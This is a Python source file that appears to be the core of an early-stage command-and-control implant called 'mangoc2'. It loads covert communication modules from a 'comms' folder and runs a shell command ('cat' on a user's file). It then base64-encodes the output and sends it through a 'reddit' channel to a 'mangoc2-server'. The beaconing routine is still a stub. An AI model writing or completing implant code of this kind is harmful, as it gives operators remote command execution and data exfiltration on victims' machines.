#!/usr/bin/python3

import os
import time
import importlib
import configparser
from base64 import  b64encode, b64decode

from commands import commands

# Global definitions
SETTINGS_FILE = "settings.ini"
COMMS_DIR = "comms"


class core:
    def __init__(self):
        self.params = {}
        self.classes = []

        # Read settings into self.params
        config = configparser.ConfigParser()
        config.read(SETTINGS_FILE)
        sections = config.sections()
        for s in sections:
            self.params[s] = dict(config.items(s))
        
        # Dynamically import comms modules
        beacon_files = os.listdir(COMMS_DIR)
        for b in beacon_files:
            if (not b in ("__pycache__", "__init__.py", "template.py") and \
                    b.endswith(".py")):
                new_class = getattr(
                    importlib.import_module(COMMS_DIR + "." + b[:-3]), b[:-3])
                self.classes.append(new_class)

    def do_beacon(self):
        # TODO: Perform a beacon
        # Call the receive function, which returns a stack (list) of commands
        # Execute commands, then send the response back with the preferred method
        pass

    def run_core(self):
        selected = "reddit"
        mods = {}

        # Initialize all comms classes
        for b in self.classes:
            name = b.__name__
            mods[name] = (b(self.params[name]))

        # for m in mods:
        #     print(m.params)
        #     print(m.receive())

        # Encode the results of a command
        result = b64encode(
            commands.do_exec("cat", "/home/kyle/test.txt"))

        # Send the encoded results of the command
        mods[selected].send("mangoc2-server", "SUBJECT", result)




def main():
    test = core()
    test.run_core()


if __name__ == "__main__":
    main()
